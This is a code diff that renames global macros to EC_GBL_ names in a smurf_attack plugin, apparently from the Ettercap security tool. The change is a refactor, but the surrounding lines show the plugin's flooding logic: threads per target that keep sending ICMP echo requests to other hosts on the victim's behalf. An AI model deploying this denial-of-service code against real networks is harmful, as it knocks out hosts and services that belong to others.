@@ -45,31 +45,31 @@ static int smurf_attack_init(void *dummy)
 
    DEBUG_MSG("smurf_attack_init");
 
-   if(GBL_OPTIONS->unoffensive) {
+   if(EC_GBL_OPTIONS->unoffensive) {
       INSTANT_USER_MSG("smurf_attack: plugin doesnt work in unoffensive mode\n");
       return PLUGIN_FINISHED;
    }
 
-   if(GBL_TARGET1->all_ip && GBL_TARGET1->all_ip6) {
+   if(EC_GBL_TARGET1->all_ip && EC_GBL_TARGET1->all_ip6) {
       USER_MSG("Add at least one host to target one list.\n");
       return PLUGIN_FINISHED;
    }
 
-   if(GBL_TARGET2->all_ip && GBL_TARGET2->all_ip6 && LIST_EMPTY(&GBL_HOSTLIST)) {
+   if(EC_GBL_TARGET2->all_ip && EC_GBL_TARGET2->all_ip6 && LIST_EMPTY(&EC_GBL_HOSTLIST)) {
       USER_MSG("Target two and global hostlist are empty.\n");
       return PLUGIN_FINISHED;
    }
 
-   GBL_OPTIONS->quiet = 1;
+   EC_GBL_OPTIONS->quiet = 1;
    INSTANT_USER_MSG("smurf_attack: starting smurf attack against the target one hosts\n");
 
    /* creating a thread per target */
-   LIST_FOREACH(i, &GBL_TARGET1->ips, next) {
+   LIST_FOREACH(i, &EC_GBL_TARGET1->ips, next) {
       ec_thread_new("smurfer", "thread performing a smurf attack", &smurfer, &i->ip);
    }
 
    /* same for IPv6 targets */
-   LIST_FOREACH(i, &GBL_TARGET1->ip6, next) {
+   LIST_FOREACH(i, &EC_GBL_TARGET1->ip6, next) {
       ec_thread_new("smurfer", "thread performing a smurf attack", &smurfer, &i->ip);
    }
 
@@ -112,12 +112,12 @@ static EC_THREAD_FUNC(smurfer)
    switch(proto) {
       case AF_INET:
          icmp_send = send_L3_icmp_echo;
-         ips = (struct ip_list_t *)&GBL_TARGET2->ips;
+         ips = (struct ip_list_t *)&EC_GBL_TARGET2->ips;
          break;
 #ifdef WITH_IPV6
       case AF_INET6:
          icmp_send = send_L3_icmp6_echo;
-         ips = (struct ip_list_t *)&GBL_TARGET2->ip6;
+         ips = (struct ip_list_t *)&EC_GBL_TARGET2->ip6;
          break;
 #endif
       default:
@@ -138,11 +138,11 @@ static EC_THREAD_FUNC(smurfer)
             icmp_send(ip, &i->ip);
       /* else using global hostlist */
       else
-         LIST_FOREACH_SAFE(h, &GBL_HOSTLIST, next, htmp)
+         LIST_FOREACH_SAFE(h, &EC_GBL_HOSTLIST, next, htmp)
             if(ntohs(h->ip.addr_type) == proto)
                icmp_send(ip, &h->ip);
 
-      ec_usleep(1000*1000/GBL_CONF->sampling_rate);
+      ec_usleep(1000*1000/EC_GBL_CONF->sampling_rate);
    }
 
    return NULL;
